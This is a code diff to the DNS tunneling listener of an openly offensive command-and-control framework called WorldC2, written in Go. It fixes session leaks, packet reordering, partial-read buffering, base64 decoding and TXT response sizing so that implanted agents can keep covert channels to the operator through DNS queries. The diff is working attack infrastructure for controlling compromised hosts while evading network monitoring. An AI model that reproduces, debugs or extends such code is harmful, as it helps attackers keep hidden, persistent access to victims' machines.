@@ -4,8 +4,8 @@ import (
 	"encoding/base64"
 	"fmt"
 	"net"
-	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/Ruby570bocadito/WorldC2/src/go/internal/crypto"
@@ -26,16 +26,31 @@ type DNSListener struct {
 }
 
 type dnsSession struct {
-	id        string
-	lastSeen  time.Time
-	upQueue   chan []byte
-	downQueue chan []byte
-	seq       uint16
+	id            string
+	lastSeenNanos atomic.Int64
+	upQueue       chan []byte
+	downQueue     chan []byte
+	seq           uint16
 }
 
-// dnsConn wraps a DNS session as a net.Conn.
+const dnsSessionIdleTimeout = 15 * time.Minute // reaper bound for abandoned sessions
+
+// dnsConn wraps a DNS session as a net.Conn. It keeps a back-pointer to the
+// listener so Close() (invoked by the C2 layer when the session ends) removes
+// the session from the map — without it every dead agent leaked its session
+// and both 256-slot queues forever.
+//
+// Read buffers partial up-queue entries: one entry can hold a whole upstream
+// query payload (~150 bytes) while callers often read 4-byte length prefixes;
+// without the buffer the remainder of the entry would be dropped and the
+// length-prefixed stream would corrupt.
 type dnsConn struct {
+	ln      *DNSListener
 	session *dnsSession
+
+	mu      sync.Mutex
+	pend    []byte
+	pendOff int
 }
 
 // NewDNSListener creates an encrypted DNS tunneling listener.
@@ -63,7 +78,9 @@ func NewDNSListener(addr string, domains []string, encKey []byte) (*DNSListener,
 // Start begins processing DNS queries.
 func (l *DNSListener) Start() {
 	go func() {
-		buf := make([]byte, 512)
+		// Generous buffer: long configured domains produce queries larger
+		// than the classic 512-byte DNS datagram.
+		buf := make([]byte, 65535)
 		for {
 			select {
 			case <-l.quit:
@@ -76,7 +93,32 @@ func (l *DNSListener) Start() {
 				continue
 			}
 
-			go l.handleQuery(buf[:n], addr)
+			// Handle inline (not in a goroutine): UDP packets for the same
+			// session must be processed FIFO or the tunnel reorders bytes.
+			l.handleQuery(buf[:n], addr)
+		}
+	}()
+
+	// Session reaper: drops sessions whose source address went silent
+	// (abandoned before the C2 layer ever accepted them, or after a Close
+	// that raced with in-flight packets).
+	go func() {
+		ticker := time.NewTicker(5 * time.Minute)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-l.quit:
+				return
+			case <-ticker.C:
+				cutoff := time.Now().Add(-dnsSessionIdleTimeout).UnixNano()
+				l.mu.Lock()
+				for id, sess := range l.sessions {
+					if sess.lastSeenNanos.Load() < cutoff {
+						delete(l.sessions, id)
+					}
+				}
+				l.mu.Unlock()
+			}
 		}
 	}()
 }
@@ -127,14 +169,14 @@ func (l *DNSListener) handleQuery(data []byte, addr *net.UDPAddr) {
 	if !ok {
 		sess = &dnsSession{
 			id:        sessionID,
-			lastSeen:  time.Now(),
-			upQueue:   make(chan []byte, 32),
-			downQueue: make(chan []byte, 32),
+			upQueue:   make(chan []byte, 256),
+			downQueue: make(chan []byte, 256),
 		}
+		sess.lastSeenNanos.Store(time.Now().UnixNano())
 		l.sessions[sessionID] = sess
 
 		select {
-		case l.acceptCh <- &dnsConn{session: sess}:
+		case l.acceptCh <- &dnsConn{ln: l, session: sess}:
 		default:
 		}
 	}
@@ -146,7 +188,7 @@ func (l *DNSListener) handleQuery(data []byte, addr *net.UDPAddr) {
 	default:
 	}
 
-	sess.lastSeen = time.Now()
+	sess.lastSeenNanos.Store(time.Now().UnixNano())
 
 	// Get downstream data
 	var response []byte
@@ -210,11 +252,32 @@ func (l *DNSListener) Addr() net.Addr {
 // --- dnsConn implements net.Conn ---
 
 func (c *dnsConn) Read(b []byte) (int, error) {
-	select {
-	case data := <-c.session.upQueue:
-		return copy(b, data), nil
-	case <-time.After(5 * time.Minute):
-		return 0, fmt.Errorf("dns read timeout")
+	c.mu.Lock()
+	if c.pendOff < len(c.pend) {
+		n := copy(b, c.pend[c.pendOff:])
+		c.pendOff += n
+		c.mu.Unlock()
+		return n, nil
+	}
+	c.mu.Unlock()
+
+	for {
+		select {
+		case data := <-c.session.upQueue:
+			if len(data) == 0 {
+				// Empty entry from an idle poll query — not stream data.
+				continue
+			}
+			c.mu.Lock()
+			c.pend = data
+			c.pendOff = 0
+			n := copy(b, c.pend[c.pendOff:])
+			c.pendOff += n
+			c.mu.Unlock()
+			return n, nil
+		case <-time.After(5 * time.Minute):
+			return 0, fmt.Errorf("dns read timeout")
+		}
 	}
 }
 
@@ -227,7 +290,19 @@ func (c *dnsConn) Write(b []byte) (int, error) {
 	}
 }
 
-func (c *dnsConn) Close() error                       { return nil }
+// Close removes the session from the listener map so dead agent endpoints do
+// not leak their (up to 2×256-slot) queues. Subsequent packets from the same
+// address simply create a fresh session.
+func (c *dnsConn) Close() error {
+	if c.ln != nil {
+		c.ln.mu.Lock()
+		if cur, ok := c.ln.sessions[c.session.id]; ok && cur == c.session {
+			delete(c.ln.sessions, c.session.id)
+		}
+		c.ln.mu.Unlock()
+	}
+	return nil
+}
 func (c *dnsConn) LocalAddr() net.Addr                { return &net.UDPAddr{IP: net.IPv4zero, Port: 53} }
 func (c *dnsConn) RemoteAddr() net.Addr               { return &net.UDPAddr{IP: net.IPv4zero, Port: 53} }
 func (c *dnsConn) SetDeadline(t time.Time) error      { return nil }
@@ -262,9 +337,15 @@ func extractDNSName(data []byte, offset int) string {
 	return name
 }
 
+// decodeDNSSubdomain decodes the payload labels of a query name. The FIRST
+// label is the client session id and is not part of the payload.
 func decodeDNSSubdomain(subdomain string) []byte {
+	labels := splitLabels(subdomain)
+	if len(labels) < 2 {
+		return nil
+	}
 	var result []byte
-	for _, label := range splitLabels(subdomain) {
+	for _, label := range labels[1:] {
 		b, err := base64Decode(label)
 		if err == nil {
 			result = append(result, b...)
@@ -297,10 +378,8 @@ func splitBy(s string, sep byte) []string {
 }
 
 func base64Decode(s string) ([]byte, error) {
-	// Handle URL-safe base64
-	s = strings.ReplaceAll(s, "-", "+")
-	s = strings.ReplaceAll(s, "_", "/")
-	return base64.StdEncoding.DecodeString(s)
+	// Client encodes raw (unpadded) URL-safe base64.
+	return base64.RawURLEncoding.DecodeString(s)
 }
 
 func buildDNSResponse(query []byte, data []byte) []byte {
@@ -308,7 +387,21 @@ func buildDNSResponse(query []byte, data []byte) []byte {
 		return nil
 	}
 
-	resp := make([]byte, len(query)+256)
+	// Pre-compute the TXT payload size so the buffer can never overflow.
+	totalLen := 0
+	if len(data) > 0 {
+		for i := 0; i < len(data); i += 255 {
+			chunk := data[i:]
+			if len(chunk) > 255 {
+				chunk = chunk[:255]
+			}
+			totalLen += 1 + len(chunk)
+		}
+	} else {
+		totalLen = 1 // single empty string
+	}
+
+	resp := make([]byte, len(query)+12+totalLen)
 	copy(resp, query)
 
 	// Set QR=1, RD=1, RA=1
